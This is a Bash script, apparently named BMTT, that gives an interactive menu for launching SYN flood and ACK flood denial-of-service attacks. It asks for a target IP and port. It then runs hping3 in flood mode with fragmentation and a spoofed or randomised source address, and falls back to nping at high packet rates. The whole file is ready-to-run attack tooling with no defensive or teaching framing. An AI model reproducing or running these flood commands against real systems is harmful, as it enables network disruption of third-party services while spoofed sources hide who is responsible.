#!/bin/bash
PS3="BMTT>"

##MAINMENU##
mainmenu()
{
mainmenu=("SYN Flood" "ACK Flood" "Quit")
select option in "${mainmenu[@]}"; do
	if [ "$option" = "Quit" ]; then
	echo "Quitting...Thank you for using BMTT!" && sleep 1 && clear
	exit 0
	elif [ "$option" = "SYN Flood" ]; then
            	synflood
        elif [ "$option" = "ACK Flood" ]; then
		ackflood
        else
            echo "Invalid option, please select a valid menu option!"
        fi
    done
}
##/MAINMENU##
##START TCPSYNFLOOD##
synflood()
{		echo "SYN Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
		echo "IP (target):"
	read -i $TARGET -e TARGET
		echo "Port (target) (defaults to 80): "
	read -i $PORT -e PORT
	: ${PORT:=80}
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
		echo "Source IP, or [r]andom or [i]nterface IP (default): "
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	echo "Send data with SYN packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
	echo "Enter number of data bytes to send (default 3333):"
	read -i $DATA -e DATA
	: ${DATA:=3333}
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3333 && echo "Invalid integer!  Using data length of 3333 bytes"
	fi
	else DATA=0
	fi
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
	fi
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying SYN Flood with nping..this will work but is not ideal"
		echo "Enter target:"
	read -i $TARGET -e TARGET
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
		: ${PORT:=80}
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting SYN Flood..."
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END SYNFLOOD##
##START ACKFLOOD##
ackflood()
{		echo "ACK Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
		echo "IP (target): "
	read -i $TARGET -e TARGET
		echo "Port (target) (defaults to 80): "
	read -i $PORT -e PORT
	: ${PORT:=80}
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
	echo "Source IP, or [r]andom or [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
	echo "Send data with ACK packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
	echo "Enter number of data bytes to send (default 3333):"
	read -i $DATA -e DATA
	: ${DATA:=3333}
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3333 && echo "Invalid integer!  Using data length of 3333 bytes"
	fi
	else DATA=0
	fi
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -A $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -A $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -A $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -A $TARGET
	fi
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying ACK Flood with nping..this will work but is not ideal"
		echo "Enter target:"
	read -i $TARGET -e TARGET
		echo "Enter target port (defaults to 80):"
	read -i $PORT -e PORT
	: ${PORT:=80}
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
		echo "Enter Source IP or use [i]nterface IP (default):"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
		echo "Enter number of packets to send per second (default is 10,000):"
	read RATE
		: ${RATE:=10000}
		echo "Enter total number of packets to send (default is 100,000):"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting ACK Flood..."
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}
##END ACKFLOOD##

##WELCOME##
clear && echo ""
echo " █████████╗ ███╗     ███╗ ████████╗████████╗"
echo " ███╔══███╗ ████╗   ████║ ╚══██╔══╝╚══██╔══╝"
echo " ████████ ╝ ██╔██╗ ██╔██║    ██║      ██║   "
echo " ███╔══███╗ ██║╚████╔╝██║    ██║      ██║   "
echo " █████████║ ██║ ╚██╔╝ ██║    ██║      ██║   "
echo " ╚════════╝ ╚═╝  ╚═╝  ╚═╝    ╚═╝      ╚═╝   "
echo ""
echo "Welcome to BMTT!" 
echo "Nếu có góp ý cải tiến gì xin hãy báo cho https://github.com/NTVuong23/BMTT.git" 
echo ""
mainmenu
##/WELCOME##
